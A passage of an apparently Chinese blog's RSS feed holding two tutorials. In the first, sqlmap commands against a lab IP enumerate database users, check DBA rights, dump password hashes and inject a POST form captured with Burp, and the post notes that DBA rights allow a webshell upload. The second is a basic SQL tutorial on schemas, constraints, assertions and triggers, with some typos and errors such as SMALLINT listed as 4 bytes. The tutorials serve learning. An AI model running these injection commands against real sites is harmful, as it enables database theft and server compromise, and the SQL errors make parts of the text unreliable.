&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; --users --batch
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627101333092.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250627101333092&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;&amp;ndash;current-user：查看当前连接数据库用户&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; --current-user --batch
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627101406633.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250627101406633&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;&amp;ndash;is-dba：判断当前用户是否是DBA（数据库管理员）&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; --is-dba --batch
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;C:%5cUsers%5clenovo%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250627101434203.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250627101434203&#34;
	
	
&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;如果是数据库管理员，就代表有写的权限，可以在服务器上面写入一句话木马&lt;/p&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;查看数据库密码&#34;&gt;查看数据库密码
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;&amp;ndash;password：自动寻找有没有常见的用户名和密码列&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;可以看成是一系列操作（找到password表和dump）的自动化&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; -passwords
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627111514038.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;结合burpsuite使用&#34;&gt;结合burpsuite使用
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;有的时候我们需要对一个表单进行注入，这时候就可以使用post注入&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;mark&gt;-r：从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;拦截请求&#34;&gt;拦截请求
&lt;/h3&gt;&lt;p&gt;在设置代理后，表单随便填一个内容提交，查看post请求内容，复制另存为.txt&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627100838668.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250627100838668&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;进行爆破&#34;&gt;进行爆破
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -r post.txt --dbs --batch
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627101026867.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250627101026867&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;同样可以得到正确结果&lt;/p&gt;
&lt;p&gt;详细的sqlmap学习请参考这位师傅的文章，非常完整，无与伦比的好：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.tr0y.wang/2018/03/21/sqlmap-guide/#sqlmap-%E7%9A%84%E5%90%84%E4%B8%AA%E9%98%B6%E6%AE%B5&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Tr0y&amp;rsquo;s Blog&amp;ndash;SQLmap 使用手册
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>快速入门SQL</title>
        <link>https://blog.928330.xyz/p/%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8sql/</link>
        <pubDate>Tue, 03 Jun 2025 01:14:02 +0800</pubDate>
        
        <guid>https://blog.928330.xyz/p/%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8sql/</guid>
        <description>&lt;h2 id=&#34;模式&#34;&gt;模式
&lt;/h2&gt;&lt;h3 id=&#34;定义模式&#34;&gt;定义模式
&lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;CREATE SCHEMA 模式名 AUTHORIZATION 用户名&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;eg:为用户ZHANG定义一个S-T模式：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;SCHEMA&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;S-T&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AUTHORIZATION&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;ZHANG&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;eg:为用户ZHANG定义一个未命名的模式：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;SCHEMA&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AUTHORIZATION&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;ZHANG&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;未定义模式名称的时候，默认模式为用户名&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;删除模式&#34;&gt;删除模式
&lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;DROP SCHEAM 模式名&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;普通&lt;/strong&gt;：用于删除空的模式，如果模式下面有对象（表、视图）等，拒绝删除&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;DROP SCHEAM 模式名 CASCADE&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;级联&lt;/strong&gt;：把模式里面的对象一并删除&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;DROP SCHEAM 模式名 RESTRICT&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;限制&lt;/strong&gt;：会把对象转移到公共模式保留并删除模式，但如果对象和模式有联系，则拒绝删除模式&lt;/p&gt;
&lt;h2 id=&#34;基本表&#34;&gt;基本表
&lt;/h2&gt;&lt;h3 id=&#34;定义基本元素&#34;&gt;定义基本元素
&lt;/h3&gt;&lt;h4 id=&#34;数据类型&#34;&gt;数据类型
&lt;/h4&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;数据类型&lt;/th&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;表示内容&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;CHAR(n)&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;长度为n的字符型&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;VARCHAR(n)&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;最大长度为n的&lt;strong&gt;变长&lt;/strong&gt;字符型&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;NUMBER(n)&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;长度为n的数字型&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;INT&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;长整型(4B)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;SMALLINT&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;短整型(4B)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;BIGINT&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;大整型(8B)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;FLOAT(n)&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;精度至少为n位的浮点数&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;DATE&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;日期，格式为&lt;strong&gt;YYYY-MM-DD&lt;/strong&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;TIME&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;时间，格式为&lt;strong&gt;HH:MM:SS&lt;/strong&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;列级完整性约束条件&#34;&gt;列级完整性约束条件
&lt;/h4&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;约束条件&lt;/th&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;意义&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;PRIMARY KEY&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;主码（元素唯一不能重复）：当&lt;strong&gt;只有一个主码&lt;/strong&gt;时，可直接在对应的属性列标注&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;NOT NULL&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;非空：表示该属性列不能取空值&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;UNIQUE&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;唯一值：表示该属性列只能取唯一值&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;CHECK&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;检查：检查该列是否满足某个条件，比如CHECK(某属性&amp;gt;20)&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;表级完整性约束条件&#34;&gt;表级完整性约束条件
&lt;/h4&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;约束条件&lt;/th&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;意义&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;PRIMARY KEY(列名1,&amp;hellip;,列名n)&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;多个主码：当&lt;strong&gt;主码由多个属性构成&lt;/strong&gt;时，&lt;br /&gt;必须作为表级完整性定义&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;FOREIGN KEY(列名1) REFERENCES 被参照表(列名1)&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;外码：被参照的列必须是 &lt;strong&gt;PRIMARY KEY&lt;/strong&gt; &lt;br /&gt;或 &lt;strong&gt;UNIQUE 约束&lt;/strong&gt; 的列，&lt;br /&gt;本表所有值来&lt;strong&gt;源于被参照的列&lt;/strong&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;特殊完整性约束条件断言&#34;&gt;特殊完整性约束条件——断言
&lt;/h3&gt;&lt;p&gt;&lt;span style=&#34;color:red;font-size:18px&#34;&gt;&lt;strong&gt;相较于列级的CHECK语句，断言能指定更一般的约束&lt;/strong&gt;&lt;/SPAN&gt;&lt;/p&gt;
&lt;h4 id=&#34;创建断言&#34;&gt;创建断言
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;CREATE ASSERTION 断言名 CHECK字句;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eg.限制A课程最多60人选修：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ASSERTION&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;ASSE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;CHECK&lt;/span&gt;(&lt;span style=&#34;color:#d19a66&#34;&gt;60&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            					     &lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;COUNT&lt;/span&gt;(&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;) 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                                     &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                                     &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;NUM&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;NUM&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;.&lt;span style=&#34;color:#c678dd&#34;&gt;CLASS&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;);  &lt;span style=&#34;color:#7f848e&#34;&gt;-- 此处具体操作原理往后看
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;删除断言&#34;&gt;删除断言
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;DROP ASSERTION 断言名;&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;特殊完整性约束条件触发器&#34;&gt;特殊完整性约束条件——触发器
&lt;/h3&gt;&lt;p&gt;&lt;span style=&#34;color:red;font-size:18px&#34;&gt;&lt;strong&gt;触发器是用户定义在关系表上的一类由事件驱动的特殊过程&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;表的拥有者才能在表上创建触发器&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;触发器只能定义在基本表上，不能定义在视图上&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;定义触发器&#34;&gt;定义触发器
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;CREATE TRIGGER 触发器名&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;{BEFORE|AFTER} 触发事件 ON 表名&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;REFERENCING NEW|OLD ROW AS 变量&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;FOR EACH {ROW|STATEMENT}&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;[WHEN 触发条件]触发动作体&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;触发事件&lt;/strong&gt;：INSERT DELETE UPDATE 或者他们的组合&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;	 还可以UPDATE OF&amp;lt;触发列1,...&amp;gt;，即进一步指明修改哪些列时激活触发器
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;BEFORE/AFTER&lt;/strong&gt;：触发时机，表示在触发事件的操作执行之前激活触发器&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ROW/STATEMENT&lt;/strong&gt;：指明是行级/语句级触发器，行级有多少行就触发多少次，语句级只触发一次&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;触发条件&lt;/strong&gt;：只有触发条件为真时才执行动作体，省略WHEN则立即执行动作体&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;触发动作体&lt;/strong&gt;：行级可以使用NEW/OLD引用事件之后的新值和事件之前的旧值，语句级不行&lt;/p&gt;
&lt;p&gt;eg.对TAB1的Grade属性修改时，若增加了10%，则将操作记录在TAB2(Name,OldGrade,NewGrade)中&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;CERATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TRIGGER&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1_T&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;AFTER&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;UPDATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;OF&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ON&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;REFERENCING&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#c678dd&#34;&gt;OLD&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;row&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AS&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;OldTuple&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#c678dd&#34;&gt;NEW&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;row&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AS&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;NewTuple&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FOR&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;EACH&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ROW&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHEN&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;NewTuple&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;.&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;OldTuple&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#c678dd&#34;&gt;INSERT&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;INTO&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;Name&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;OldGrade&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;NewGrade&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#c678dd&#34;&gt;VALUES&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;OldTuple&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Name&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;OldTuple&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;NewTuple&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果触发器内有多个语句，要定义新的定界符（不常用的），并使用BEGIN和END包裹：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;-- 1. 将定界符从 ; 改为 //
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;DELIMITER&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;//&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;-- 2. 定义包含多条语句的触发器
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;TRIGGER&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1_T&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;AFTER&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;UPDATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;OF&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Grade&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;ON&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
